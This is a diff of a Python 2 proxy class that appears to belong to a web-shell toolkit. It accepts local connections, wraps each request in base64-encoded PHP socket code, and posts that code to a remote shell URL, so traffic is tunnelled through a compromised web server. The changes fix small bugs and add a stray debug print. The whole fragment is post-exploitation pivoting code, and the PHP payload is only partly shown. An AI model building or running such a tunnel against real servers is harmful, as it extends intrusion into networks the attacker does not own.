@@ -8,18 +8,19 @@ from multiprocessing import Process
 
 
 class Proxy(Process):
-    host = ''
+    host = 'localhost'
     port = 8888
 
     def set_shell_url(self, sh_url):
         self.shell_url = sh_url
 
-    def parse_request(self, sh_url, conn):
+    def forward_request(self, sh_url, conn):
         buff = conn.recv(24000)
-        data = None
+        data = ""
         while buff:
             data += buff
             buff = conn.recv(24000)
+            print "here"
         if data:
             lines = data.split("\r\n")
             l1 = lines[0]
@@ -39,7 +40,8 @@ class Proxy(Process):
                           fclose($fp);""".format(parsed_url.hostname, port, b64_request.replace(os.linesep, ""))
             b64_php_code = "param={0}".format(encodestring(php_code))
             response = request.do_request(sh_url, b64_php_code.replace(os.linesep, ""), None)
-            conn.send(response)
+            if response:
+                conn.send(response)
         conn.close()
 
     def run(self):
@@ -51,8 +53,7 @@ class Proxy(Process):
         self.run_flag = True
         while self.run_flag:
             conn, addr = s.accept()
-            start_new_thread(self.parse_request, (self.shell_url, conn))
-            s.close()
+            start_new_thread(self.forward_request, (self.shell_url, conn))
 
     def stop(self):
         self.run_flag = False
